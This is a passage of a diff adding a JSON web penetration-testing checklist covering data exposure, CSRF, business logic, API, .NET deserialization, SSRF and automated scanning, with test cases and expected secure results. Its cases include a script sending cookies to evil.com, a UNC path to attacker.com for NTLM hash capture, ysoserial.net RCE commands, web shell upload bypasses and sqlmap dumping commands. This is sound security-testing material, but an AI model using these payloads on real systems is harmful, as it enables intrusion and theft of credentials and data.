+        "expected": "100% of traffic over HTTPS. HSTS with includeSubDomains. No mixed content. WebSockets use wss://.",
+        "tools": [
+          "Burp Suite",
+          "Browser DevTools Network tab"
+        ],
+        "cwe": [
+          "CWE-319"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "DATA-01",
+        "name": "Excessive Data Exposure in API Responses",
+        "sev": "high",
+        "how": "Review all API responses for fields returned but never displayed in the UI — excessive data exposure.",
+        "cases": [
+          "Compare API response JSON fields vs fields visible in UI — extra undisplayed fields?",
+          "GET /api/users/me → returns password_hash, internal_id, balance, created_by?",
+          "GET /api/products → returns cost_price, supplier_id, margin alongside public fields?",
+          "GET /api/users (list) → returns all user details instead of just name/id?",
+          "Check nested objects: does order API return full customer object or just customer ID?",
+          "Filter applied client-side? If all data sent and frontend hides some = vulnerability"
+        ],
+        "expected": "API returns minimum necessary data. No sensitive fields (password, PAN, SSN, internal IDs) in any response.",
+        "tools": [
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-200"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "DATA-02",
+        "name": "Sensitive Data in JavaScript & Source",
+        "sev": "high",
+        "how": "Review JavaScript bundles, source maps, and HTML for credentials, keys, and internal configuration.",
+        "cases": [
+          "Search JS: apiKey, api_key, password, secret, Bearer, connectionString, AWS_ACCESS_KEY",
+          "Check for .js.map files → expose original TypeScript/source pre-compilation",
+          "HTML comments: <!-- TODO: remove password | <!-- admin@internal.com -->",
+          "meta tags: generator info, internal build IDs, version numbers",
+          "Check environment variables bundled in frontend: REACT_APP_API_KEY, VUE_APP_SECRET",
+          "localStorage.setItem() in JS for sensitive token storage",
+          "Search for: 192.168. | 10.0. | .internal | .corp | .local in JS files"
+        ],
+        "expected": "No credentials, tokens, API keys, or internal infrastructure details in any client-side code.",
+        "tools": [
+          "Browser DevTools Sources",
+          "Burp filter .js .map",
+          "grep",
+          "LinkFinder"
+        ],
+        "cwe": [
+          "CWE-200"
+        ],
+        "mitre": [
+          "T1552"
+        ]
+      },
+      {
+        "id": "DATA-03",
+        "name": "Backup & Config File Exposure",
+        "sev": "critical",
+        "how": "Test for accessible backup files, configuration, and source control repositories.",
+        "cases": [
+          "Try: /web.config | /appsettings.json | /appsettings.Development.json",
+          "Try: /web.config.bak | /web.config.old",
+          "Try: /.git/config | /.git/HEAD | /.git/COMMIT_EDITMSG",
+          "Try: /.env | /.env.production | /.env.backup | /.env.local",
+          "Try: /database.sql | /backup.zip | /db_backup.sql",
+          "gobuster with backup file wordlist: SecLists/Discovery/Web-Content/Common-DB-Backups.txt"
+        ],
+        "expected": "Config files not web-accessible. .git directory blocked. Backup files absent from web root.",
+        "tools": [
+          "gobuster",
+          "feroxbuster",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-538"
+        ],
+        "mitre": [
+          "T1552"
+        ]
+      },
+      {
+        "id": "DATA-04",
+        "name": "Browser Caching & Autocomplete",
+        "sev": "low",
+        "how": "Test for sensitive data cached in browser and autocomplete enabled on sensitive fields.",
+        "cases": [
+          "Inspect Cache-Control headers on sensitive pages: should include no-store",
+          "After viewing sensitive page: browser Back button → stale cached data shown?",
+          "Password fields: autocomplete=\"off\" or autocomplete=\"new-password\" set?",
+          "Credit card fields: autocomplete=\"off\" set?",
+          "OTP/PIN fields: autocomplete=\"off\" set?",
+          "Browser history: are session tokens visible in URL history?"
+        ],
+        "expected": "Sensitive pages have Cache-Control: no-store. Sensitive form fields have autocomplete=\"off\".",
+        "tools": [
+          "Browser DevTools",
+          "Burp",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-524"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-CRYP-04",
+        "name": "Weak Cryptography Testing",
+        "sev": "high",
+        "how": "Test for weak or obsolete cryptographic algorithms for passwords, tokens, and encrypted data.",
+        "cases": [
+          "Password hash disclosure: any MD5 or SHA-1 hashes in response/DB errors? (need bcrypt/argon2)",
+          "Token entropy: run password reset tokens through Burp Sequencer — low entropy?",
+          "Test JWT HMAC secret strength: hashcat -a 0 -m 16500 token.txt rockyou.txt",
+          "ECB mode detection: encrypt two identical plaintext blocks → same ciphertext = ECB",
+          "Hardcoded IV/nonce: always same IV = deterministic encryption = weak",
+          "Symmetric key in config file or JS: hardcoded AES keys",
+          "Check: is encryption used where hashing should be? (passwords encrypted, not hashed)"
+        ],
+        "expected": "Passwords hashed with bcrypt/argon2/scrypt. Tokens have >=128 bits entropy. No hardcoded keys. No MD5/SHA-1 for passwords.",
+        "tools": [
+          "Burp Sequencer",
+          "hashcat",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-326",
+          "CWE-327"
+        ],
+        "mitre": []
+      }
+    ]
+  },
+  {
+    "id": "P8",
+    "name": "CSRF & Business Logic",
+    "items": [
+      {
+        "id": "WSTG-SESS-05",
+        "name": "CSRF Token Validation",
+        "sev": "high",
+        "how": "Test if CSRF tokens are present and properly validated on ALL state-changing requests.",
+        "cases": [
+          "Identify state-changing POST/PUT/DELETE requests (any that modify data)",
+          "Remove CSRF token entirely → request still succeeds? (FAIL if yes)",
+          "Submit empty string CSRF token → succeeds? (FAIL if yes)",
+          "Submit random invalid CSRF token → succeeds? (FAIL if yes)",
+          "Cross-user: use CSRF token from User A in User B session → accepted? (should fail)",
+          "Content-type confusion: send JSON CSRF payload as application/x-www-form-urlencoded",
+          "Request without Origin or Referer header → still processed? SameSite cookie bypass?",
+          ".NET: AntiForgeryToken present on ALL Razor/MVC forms?",
+          "Create PoC HTML page: <form action=\"https://target.com/transfer\" method=\"POST\">..."
+        ],
+        "expected": "CSRF tokens required and validated on all state-changing requests. Tokens session-bound. Invalid tokens return 400/403.",
+        "tools": [
+          "Burp Repeater",
+          "Manual CSRF PoC HTML"
+        ],
+        "cwe": [
+          "CWE-352"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-BUSL-01",
+        "name": "Business Logic Data Validation",
+        "sev": "high",
+        "how": "Test for negative values, zero values, out-of-range inputs, and boundary conditions in business logic.",
+        "cases": [
+          "Cart quantity=-1 (negative — could result in credit/refund)",
+          "Cart quantity=0",
+          "Cart quantity=999999 (integer overflow check)",
+          "Price field in hidden input: change to 0.01",
+          "Price=-1 (negative price = credit balance increase?)",
+          "Apply same discount code twice in rapid succession",
+          "Discount >100%: code that reduces to negative price?",
+          "Transfer amount=0 | amount=0.000001 | amount=2147483648 (INT_MAX+1)",
+          "Date fields: test past dates, future dates, 1970-01-01, 9999-12-31"
+        ],
+        "expected": "Server-side validation enforces all business rules. Negative values, overflow, and zero rejected. All validation server-side.",
+        "tools": [
+          "Burp Repeater",
+          "Burp Intruder",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-20"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-BUSL-04",
+        "name": "Race Conditions / TOCTOU",
+        "sev": "high",
+        "how": "Test single-use operations for race conditions using concurrent requests.",
+        "cases": [
+          "Identify single-use resources: discount codes, invite links, vote buttons, limited stock",
+          "Burp Repeater: send 10-20 identical requests simultaneously (Send group in parallel)",
+          "Apply same coupon code from 20 concurrent sessions",
+          "Create same username from 2 concurrent requests → which wins?",
+          "Withdraw same funds from 2 concurrent requests → double spend?",
+          "Book last item in inventory from 2 concurrent requests → 2 bookings?",
+          "Turbo Intruder: 100+ concurrent requests for high-frequency race condition testing"
+        ],
+        "expected": "Atomic operations enforced via database transactions. Only one success returned for concurrent single-use operations.",
+        "tools": [
+          "Burp Repeater (parallel)",
+          "Turbo Intruder",
+          "Custom concurrent scripts"
+        ],
+        "cwe": [
+          "CWE-362"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-BUSL-06",
+        "name": "Multi-Step Workflow Bypass",
+        "sev": "high",
+        "how": "Test multi-step workflows by skipping steps to reach later stages without completing prerequisites.",
+        "cases": [
+          "Checkout: go direct to /checkout/confirm without completing /checkout/shipping",
+          "Password reset: skip to /reset-password without completing email verification step",
+          "MFA: skip MFA page after login step 1 → access main app directly?",
+          "Email verification: access verified-only features without clicking verification link",
+          "Account setup wizard: skip steps 2-5 → access main application?",
+          "Premium feature: access /premium/feature URL directly as free-tier user"
+        ],
+        "expected": "Workflow state enforced server-side. Each step validates all prerequisite steps completed. No step-skipping possible.",
+        "tools": [
+          "Burp Repeater",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-841"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-BUSL-10",
+        "name": "Payment Functionality Testing",
+        "sev": "critical",
+        "how": "Test payment flows for price manipulation, currency tampering, and negative value abuse.",
+        "cases": [
+          "Intercept checkout POST → modify total_price=0.01 in body",
+          "Change currency code: USD → BTC → VND (lower value currency)",
+          "Negative quantity: quantity=-1 (credit to account?)",
+          "Apply multiple discount codes simultaneously (should be limited)",
+          "Refund more than original purchase amount",
+          "Add item to cart at price A, change to price B after price-locking step",
+          "Coupon single-use: apply same code from 2 sessions simultaneously",
+          "Payment skip: initiate payment, navigate directly to /order/confirmation URL"
+        ],
+        "expected": "Price calculated server-side only. Client-supplied price/currency rejected. Single-use coupons atomically enforced.",
+        "tools": [
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-840"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-BUSL-09",
+        "name": "Malicious File Upload",
+        "sev": "critical",
+        "how": "Test file upload functionality to upload web shells and bypass extension/MIME type restrictions.",
+        "cases": [
+          "Upload: shell.aspx (ASP.NET web shell directly)",
+          "Double extension: shell.aspx.jpg",
+          "Null byte: shell.aspx%00.jpg",
+          "Case variation: shell.ASPX | shell.aSPx | shell.aSpX",
+          "Content-Type mismatch: keep .aspx ext, change Content-Type: image/jpeg",
+          "SVG XSS: <svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.domain)</script></svg>",
+          "HTML upload: <script>document.location=\"https://evil.com/?c=\"+document.cookie</script>",
+          "Path traversal in filename: ../../shell.aspx | ../wwwroot/shell.aspx",
+          "Polyglot: valid GIF89a header + embedded ASPX code",
+          "After upload: try accessing file directly via URL → is it executable?"
+        ],
+        "expected": "Uploaded files stored outside web root. Extension whitelist enforced. MIME validated server-side. Uploaded files not executable.",
+        "tools": [
+          "Burp Repeater",
+          "Manual",
+          "weevely (ASPX shells)"
+        ],
+        "cwe": [
+          "CWE-434"
+        ],
+        "mitre": [
+          "T1505"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "P9",
+    "name": "API Security",
+    "items": [
+      {
+        "id": "API1",
+        "name": "API1:2023 — Broken Object Level Authorization",
+        "sev": "critical",
+        "how": "Test every API endpoint with resource IDs for access control at the object level using two test accounts.",
+        "cases": [
+          "GET /api/users/101 → change to /api/users/102 with same auth token",
+          "GET /api/orders/500 → /api/orders/501 → /api/orders/1",
+          "GET /api/documents/abc → enumerate other document IDs",
+          "User A token: GET /api/users/B-id/profile → should 403",
+          "Remove Authorization header entirely → unauthenticated access?",
+          "Test all ID types: int, UUID, Base64, custom hash",
+          "API v1 vs v2: does /api/v1/ have weaker auth than /api/v2/?",
+          "Batch endpoint: /api/users?ids=101,102,103 → returns all users data?"
+        ],
+        "expected": "Every API resource access validated against requesting user session. 403 returned for unauthorized resource access.",
+        "tools": [
+          "Burp Intruder",
+          "Autorize",
+          "Manual — 2 accounts"
+        ],
+        "cwe": [
+          "CWE-639"
+        ],
+        "mitre": [
+          "T1078"
+        ]
+      },
+      {
+        "id": "API2",
+        "name": "API2:2023 — Broken Authentication",
+        "sev": "critical",
+        "how": "Test API authentication mechanisms for weaknesses in token validation and transmission.",
+        "cases": [
+          "Call API with expired token → 401 returned?",
+          "Call API with no Authorization header → 401 returned?",
+          "Call API with malformed/truncated token → 401 returned?",
+          "Call API with token from different environment (dev token on prod) → rejected?",
+          "API key in URL: ?api_key=xxx → insecure (should be in header)",
+          "Basic Auth: credentials over HTTP? Credentials in URL?",
+          "API key rotation: old key still works after rotation? (Should be invalidated)",
+          "Token binding: can stolen token be used from different IP/User-Agent?"
+        ],
+        "expected": "All API endpoints require valid, non-expired tokens. Tokens in Authorization header. Old/revoked tokens rejected.",
+        "tools": [
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-287"
+        ],
+        "mitre": [
+          "T1078"
+        ]
+      },
+      {
+        "id": "API3",
+        "name": "API3:2023 — Broken Object Property Level Authorization",
+        "sev": "high",
+        "how": "Test if APIs return more data than shown in UI, and if mass assignment filters work.",
+        "cases": [
+          "Compare full API response vs UI-displayed fields — hidden fields returned?",
+          "/api/users/me → includes password_hash, internal_id, admin_notes, balance?",
+          "/api/products → returns cost_price, supplier_margin, stock_level to buyers?",
+          "PATCH /api/users/me with extra: {\"isAdmin\":true,\"role\":\"admin\"} → applied?",
+          "PUT /api/orders/1 with status:\"paid\" → status changes without payment?",
+          "POST new resource with extra privileged fields → are they saved?"
+        ],
+        "expected": "API returns minimum data per operation. All write operations only apply whitelisted fields.",
+        "tools": [
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-200",
+          "CWE-915"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "API4",
+        "name": "API4:2023 — Unrestricted Resource Consumption",
+        "sev": "medium",
+        "how": "Test API endpoints for absence of rate limiting and resource consumption controls.",
+        "cases": [
+          "Send 100+ rapid requests to login endpoint → 429 Too Many Requests returned?",
+          "Test OTP endpoint: 100 requests → rate limited?",
+          "Large payload: send 10MB+ JSON body → server handles gracefully? Memory issue?",
+          "Deeply nested JSON: {\"a\":{\"a\":{\"a\":...}}} → parsing DoS?",
+          "Pagination: GET /api/items?limit=99999 → server enforces max page size?",
+          "X-Forwarded-For bypass: rotate header values to bypass IP-based rate limiting",
+          "GraphQL batching: send 1000 queries in one request → rate limited?"
+        ],
+        "expected": "Rate limiting enforced (429). Max payload size enforced. Pagination size capped. Rate limit cannot be bypassed via IP headers.",
+        "tools": [
+          "Burp Intruder",
+          "Turbo Intruder",
+          "curl"
+        ],
+        "cwe": [
+          "CWE-770"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "API5",
+        "name": "API5:2023 — Broken Function Level Authorization",
+        "sev": "critical",
+        "how": "Test if regular users can call admin-level API functions by calling them directly.",
+        "cases": [
+          "POST /api/admin/users as regular user → 403?",
+          "DELETE /api/admin/users/1 as regular user → 403?",
+          "GET /api/admin/reports as regular user → 403?",
+          "PUT /api/users/102/role with {\"role\":\"admin\"} as regular user → 403?",
+          "POST /api/products (create product) as buyer role → 403?",
+          "GET /api/admin/users — HTTP method switch: try GET if POST is documented",
+          "Access undocumented admin endpoints found in JS files"
+        ],
+        "expected": "Function-level authorization enforced server-side. Admin API endpoints return 403 for non-admin authenticated tokens.",
+        "tools": [
+          "Burp Repeater",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-285"
+        ],
+        "mitre": [
+          "T1548"
+        ]
+      },
+      {
+        "id": "API6",
+        "name": "API6-8:2023 — Mass Assignment, Misconfiguration, Injection",
+        "sev": "high",
+        "how": "Test API-specific mass assignment, security misconfiguration, and injection issues.",
+        "cases": [
+          "Mass assignment: POST with {\"name\":\"x\",\"isAdmin\":true,\"balance\":99999}",
+          "Swagger exposed: /swagger | /api-docs | /openapi.json → blocked in prod?",
+          "CORS: Access-Control-Allow-Origin: * with credentials? Permissive origin policy?",
+          "API over HTTP: any API endpoint accessible without TLS?",
+          "GraphQL injection: {user(id:\"1 UNION...\")} or SSTI in arguments",
+          "Error verbosity: do API errors expose stack traces, SQL errors, internal paths?",
+          "Unnecessary HTTP methods on API: DELETE/PUT on read-only endpoints?"
+        ],
+        "expected": "Swagger absent in production. CORS restrictive. All API endpoints over HTTPS. Generic error messages.",
+        "tools": [
+          "Burp Suite",
+          "Browser",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-16",
+          "CWE-915"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "WSTG-APIT-99",
+        "name": "GraphQL Security Testing",
+        "sev": "high",
+        "how": "Test GraphQL endpoints for introspection, authorization bypass, injection, and denial of service.",
+        "cases": [
+          "Introspection: {__schema{types{name}}} → disabled in production? (Must be)",
+          "Field suggestion: send invalid field → \"Did you mean...?\" leaks schema structure",
+          "Query all fields on object types → excessive data exposure?",
+          "Authorization: query {user(id:1){secretField}} as unauthorized user → 403?",
+          "Injection in args: {user(id:\"1; DROP TABLE users--\")} | SSTI in string args",
+          "Batching DoS: send 1000 queries in single request → rate limited?",
+          "Alias attack: multiple queries in one request bypassing rate limits",
+          "Nested query DoS: {a{b{c{d{e{f{...}}}}}}} → depth limit enforced?"
+        ],
+        "expected": "Introspection disabled. Per-field authorization enforced. Query depth/complexity limits set. Batching rate-limited.",
+        "tools": [
+          "GraphQL Playground",
+          "Burp InQL extension",
+          "Altair",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-284"
+        ],
+        "mitre": []
+      }
+    ]
+  },
+  {
+    "id": "P10",
+    "name": ".NET Specific",
+    "items": [
+      {
+        "id": "NET-01",
+        "name": "ViewState Deserialization (MAC Disabled)",
+        "sev": "critical",
+        "how": "Test if ViewState MAC validation is disabled, enabling RCE via crafted deserialization payload.",
+        "cases": [
+          "Find __VIEWSTATE field in form HTML source",
+          "Tamper one byte in Base64 ViewState value → resubmit",
+          "Expected: MAC validation error (ViewState is invalid) — this is GOOD",
+          "Not expected: page loads normally with tampered ViewState — MAC DISABLED = CRITICAL",
+          "If MAC disabled: ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"whoami > C:\\inetpub\\wwwroot\\poc.txt\"",
+          "Submit crafted ViewState → check for /poc.txt → confirm RCE",
+          "Machine key discovery: Blacklist3r — try known default machine keys list",
+          "Verify web.config: enableViewStateMac=\"false\" or viewStateEncryptionMode=\"Never\""
+        ],
+        "expected": "ViewState MAC validation always enabled. Tampered ViewState causes InvalidViewStateException. Machine key not exposed.",
+        "tools": [
+          "ysoserial.net",
+          "Blacklist3r",
+          "AspDotNetWrapper",
+          "Burp Decoder"
+        ],
+        "cwe": [
+          "CWE-502"
+        ],
+        "mitre": [
+          "T1059"
+        ]
+      },
+      {
+        "id": "NET-02",
+        "name": ".NET Deserialization (Json.NET / BinaryFormatter)",
+        "sev": "critical",
+        "how": "Test .NET JSON and binary deserialization endpoints for arbitrary type instantiation and RCE.",
+        "cases": [
+          "Test JSON.NET $type: add \"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\" to JSON body",
+          "Json.NET gadget: $type → Windows.Data → RCE via Process.Start",
+          "BinaryFormatter payload: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c \"whoami\"",
+          "Submit Base64-encoded BinaryFormatter payload in cookies or body parameters",
+          "Check for JavaScriptSerializer with SimpleTypeResolver (type disclosure in __type field)",
+          "DataContractSerializer with known type list: can arbitrary type be injected?",
+          "WCF endpoints (.svc): test with ysoserial WCF gadget chains"
+        ],
+        "expected": "TypeNameHandling=None in all Json.NET usage. BinaryFormatter disabled (.NET 7+ throws by default). Only safe types allowed.",
+        "tools": [
+          "ysoserial.net",
+          "Burp Suite",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-502"
+        ],
+        "mitre": [
+          "T1059"
+        ]
+      },
+      {
+        "id": "NET-03",
+        "name": "Open Redirect in .NET Applications",
+        "sev": "medium",
+        "how": "Test redirect parameters in ASP.NET login, logout, and navigation flows for open redirect to external domains.",
+        "cases": [
+          "?ReturnUrl=https://evil.com — classic ASP.NET login redirect",
+          "?redirect=//evil.com (protocol-relative URL)",
+          "?next=https://evil.com | ?url=javascript:alert(1)",
+          "URL encoded: ?ReturnUrl=%2F%2Fevil.com",
+          "After login redirect: is ReturnUrl validated against internal paths only?",
+          "Bypass: ?ReturnUrl=https://target.com.evil.com (subdomain of target)",
+          "Bypass: ?ReturnUrl=https://target.com@evil.com (@ username trick)",
+          "Bypass: ?ReturnUrl=https://evil.com#https://target.com (fragment)"
+        ],
+        "expected": "ReturnUrl and all redirect parameters validated against allowlist of internal relative paths. External URLs rejected.",
+        "tools": [
+          "Burp Repeater",
+          "Manual"
+        ],
+        "cwe": [
+          "CWE-601"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "NET-04",
+        "name": "Padding Oracle Attack",
+        "sev": "high",
+        "how": "Test for padding oracle vulnerability in ASP.NET applications using custom CBC-mode encryption.",
+        "cases": [
+          "Identify encrypted values in cookies or URL params (look for Base64 of multiples of 16 bytes)",
+          "Check .ASPXAUTH cookie if using non-default encryption settings",
+          "Modify a single byte in ciphertext → observe if error differs from other errors (oracle)",
+          "PadBuster: padbuster https://target.com/page ENCVALUE 8 -encoding 0 -cookie \"auth=ENCVALUE\"",
+          "POET (Padding Oracle Exploitation Tool) for automated testing",
+          "If oracle confirmed: PadBuster can decrypt ciphertext or encrypt arbitrary plaintext",
+          "ASP.NET specific: MachineKey-based encryption in older .NET WebForms apps"
+        ],
+        "expected": "No observable difference in error responses for valid vs invalid padding. Uniform error handling regardless of padding.",
+        "tools": [
+          "PadBuster",
+          "POET",
+          "Burp Repeater"
+        ],
+        "cwe": [
+          "CWE-326"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "NET-05",
+        "name": "Machine Key & Forms Auth Ticket Forgery",
+        "sev": "critical",
+        "how": "Test if the .NET machine key can be identified to forge Forms Authentication tickets, ViewState, or session data.",
+        "cases": [
+          "Check /web.config direct access — look for <machineKey validationKey=\"...\" decryptionKey=\"...\">",
+          "Check /elmah.axd error log — may contain config details or machine key info",
+          "Search GitHub for company machine key disclosure in committed configs",
+          "If machine key found: Blacklist3r → forge .ASPXAUTH cookie with arbitrary username + roles",
+          "ysoserial.net -g TypeConfuseDelegate -f ViewState -c \"whoami\" --path \"/path/page.aspx\" --apppath \"/\"",
+          "Test known default/weak machine keys list (publicly available databases)",
+          "Burp: replace .ASPXAUTH cookie with forged value → request authenticated page"
+        ],
+        "expected": "Machine key not exposed in any web-accessible file. No default or weak machine key used. Config files inaccessible.",
+        "tools": [
+          "Blacklist3r",
+          "ysoserial.net",
+          "Burp Suite"
+        ],
+        "cwe": [
+          "CWE-321"
+        ],
+        "mitre": [
+          "T1078"
+        ]
+      },
+      {
+        "id": "NET-06",
+        "name": "IIS Misconfiguration & Tilde Enumeration",
+        "sev": "medium",
+        "how": "Test for IIS-specific misconfigurations: WebDAV, 8.3 filename disclosure, handler mappings, default pages.",
+        "cases": [
+          "IIS tilde enumeration: GET /~1/ HTTP/1.1 → IIS 8.3 short filename disclosure",
+          "GET /s~1/ → discover files starting with s (e.g. secret.aspx → s~1.asp)",
+          "OPTIONS / → check for WebDAV methods: PROPFIND, MKCOL, PUT, LOCK",
+          "PROPFIND / HTTP/1.1 → WebDAV discovery response",
+          "Check /iisstart.htm — default IIS welcome page = version disclosure",
+          "Handler mapping: try /file.aspx. (trailing dot) | /file.config.ashx",
+          "ASMX: try /?wsdl on .asmx endpoints → SOAP WSDL schema exposure"
+        ],
+        "expected": "WebDAV disabled. IIS tilde enumeration mitigated (URLScan or RequestFiltering). No default IIS pages. No WSDL in prod.",
+        "tools": [
+          "Burp Repeater",
+          "curl",
+          "IIS Short Name Scanner"
+        ],
+        "cwe": [
+          "CWE-16"
+        ],
+        "mitre": []
+      },
+      {
+        "id": "NET-07",
+        "name": ".NET SSRF via HttpClient / WebClient",
+        "sev": "high",
+        "how": "Test .NET-specific SSRF vectors including file:// protocol and UNC path NTLM credential capture.",
+        "cases": [
+          "Identify server-side URL fetching: HttpClient, WebClient, WebRequest, HttpWebRequest usage",
+          "File protocol: file:///C:/windows/win.ini in URL parameters",
+          "UNC path SSRF: \\\\attacker.com\\share\\ (triggers NTLM auth to attacker)",
+          "Responder to capture NTLM hash: responder -I eth0",
+          "AWS metadata: http://169.254.169.254/latest/meta-data/",
+          "Internal service discovery via SSRF: http://127.0.0.1:PORT (enumerate internal ports)",
+          "Test PDF generation features: load external URL in wkhtmltopdf or similar",
+          "Test: are DNS-only lookups possible (SSRF for internal hostname enumeration)?"
+        ],
+        "expected": "URL parameters validated against strict allowlist. UNC paths rejected. File protocol blocked. Cloud metadata unreachable.",
+        "tools": [
+          "Burp Collaborator",
+          "interactsh",
+          "Responder (NTLM capture)"
+        ],
+        "cwe": [
+          "CWE-918"
+        ],
+        "mitre": [
+          "T1090"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "P11",
+    "name": "Automated Scanning",
+    "items": [
+      {
+        "id": "SCAN-01",
+        "name": "OWASP ZAP Passive & Active Scan",
+        "sev": "info",
+        "how": "Run ZAP passive scan during manual browsing and active scan after authentication is configured.",
+        "cases": [
+          "Configure browser to proxy through ZAP (127.0.0.1:8081)",
+          "Browse entire application while logged in as each user role",
+          "ZAP Alerts tab → review all passive findings (sort by Risk: High first)",
+          "For active scan: ensure authenticated session configured in ZAP",
+          "Right-click target → Active Scan → Configure scan policy",
+          "Use Ajax Spider first for SPA applications (React/Angular/Vue)",
+          "ZAP: Report → Generate Report → HTML format → save to /reports/",
+          "Verify all Medium+ alerts manually before including in report"
+        ],
+        "expected": "All ZAP findings reviewed and triaged. Real findings added to checklist. False positives noted.",
+        "tools": [
+          "OWASP ZAP"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "SCAN-02",
+        "name": "Burp Suite Passive Scan Review",
+        "sev": "info",
+        "how": "Review Burp passive scan issues accumulated during manual browsing session.",
+        "cases": [
+          "Burp Dashboard → Issues → filter by Severity: High, Medium",
+          "Review for: mixed content, missing headers, weak cookies, info disclosure, CSRF",
+          "Target → Issues tab → per-host view of all passive findings",
+          "Burp Comparer: compare admin vs regular user responses for access control",
+          "Burp Sequencer: run on session tokens → FIPS analysis report",
+          "Right-click interesting requests → Scan for issues",
+          "Export Burp project file as backup: Burp → Save project"
+        ],
+        "expected": "All passive findings reviewed. Genuine findings added to checklist. Burp project file saved as evidence.",
+        "tools": [
+          "Burp Suite"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "SCAN-03",
+        "name": "Nikto & Nuclei Automated Scans",
+        "sev": "info",
+        "how": "Run Nikto for web server misconfigs and Nuclei for known CVEs, exposures, and misconfigurations.",
+        "cases": [
+          "nikto -h https://target.com -ssl -output nikto_report.html",
+          "nikto: review missing headers, dangerous files, outdated software, known CVEs",
+          "nuclei -u https://target.com -t cves/ -severity critical,high -o nuclei_cves.txt",
+          "nuclei -u https://target.com -t misconfigurations/ -severity high,medium",
+          "nuclei -u https://target.com -t exposures/ -o nuclei_exposures.txt",
+          "nuclei -u https://target.com -t technologies/ (fingerprint)",
+          "Manually verify ALL Critical and High Nuclei findings before reporting"
+        ],
+        "expected": "All tool findings reviewed. Critical and High findings manually verified. No unverified findings in final report.",
+        "tools": [
+          "nikto",
+          "nuclei",
+          "nuclei-templates"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "SCAN-04",
+        "name": "sqlmap Automated SQLi Scan",
+        "sev": "info",
+        "how": "Run sqlmap against all identified injection-susceptible endpoints for comprehensive SQL injection testing.",
+        "cases": [
+          "sqlmap -u 'https://target.com/page?id=1' --batch --dbs --level=3 --risk=2",
+          "sqlmap POST: sqlmap -u URL --data='id=1&name=test' --batch",
+          "Cookie injection: sqlmap -u URL --cookie='id=1' --batch",
+          "Header injection: sqlmap -u URL --headers='User-Agent: *' --batch",
+          "All techniques: sqlmap -u URL --technique=BEUSTQ --batch",
+          "Save output: sqlmap -u URL --output-dir=./sqlmap-results",
+          "Review sqlmap log for confirmed injection points and dumped data"
+        ],
+        "expected": "No confirmed SQL injection vectors. All sqlmap tests return no vulnerable parameters.",
+        "tools": [
+          "sqlmap"
+        ],
+        "cwe": [
+          "CWE-89"
+        ],
+        "mitre": []
+      }
+    ]
+  },
+  {
+    "id": "P12",
+    "name": "Documentation",
+    "items": [
+      {
+        "id": "DOC-01",
+        "name": "Finding Documentation Template",
+        "sev": "info",
+        "how": "Document every confirmed finding with all required fields before moving to the next test.",
+        "cases": [
+          "Title: short descriptive name — \"SQL Injection in /api/search endpoint, id parameter\"",
+          "Affected URL + parameter: exact vulnerable URL and parameter name",
+          "Severity: Critical/High/Medium/Low/Info with CVSS 3.1 score",
+          "CWE Reference: CWE-89 (SQL Injection)",
+          "Description: what is the vulnerability, why it exists, what code path is affected",
+          "Steps to Reproduce: numbered steps, exact request/response with screenshots",
+          "Evidence: Burp request/response screenshot, HTTP request in code block",
+          "Impact: what attacker can achieve — data exfil, account takeover, RCE, DoS?",
+          "Remediation: specific technical fix with code example (use parameterized queries: cmd.Parameters.Add(...))",
+          "References: OWASP link, CWE link, CVE if applicable"
+        ],
+        "expected": "Every finding documented with all required fields. Evidence attached. Remediation specific and actionable.",
+        "tools": [
+          "Burp Suite screenshots",
+          "Flameshot/Greenshot",
+          "Report template"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "DOC-02",
+        "name": "CVSS 3.1 Scoring for All Findings",
+        "sev": "info",
+        "how": "Calculate CVSS 3.1 base scores for each finding for objective severity comparison.",
+        "cases": [
+          "NVD CVSS calculator: https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator",
+          "Base metrics: Attack Vector (N/A/L/P), Attack Complexity (L/H), Privileges Required (N/L/H), User Interaction (N/R), Scope (U/C), CIA impact (N/L/H)",
+          "Example: Unauthenticated SQLi = CVSS 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
+          "Example: Stored XSS requiring auth = CVSS 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)",
+          "Map scores: 9.0-10.0=Critical, 7.0-8.9=High, 4.0-6.9=Medium, 0.1-3.9=Low",
+          "Document temporal metrics if applicable (exploit availability, remediation level)"
+        ],
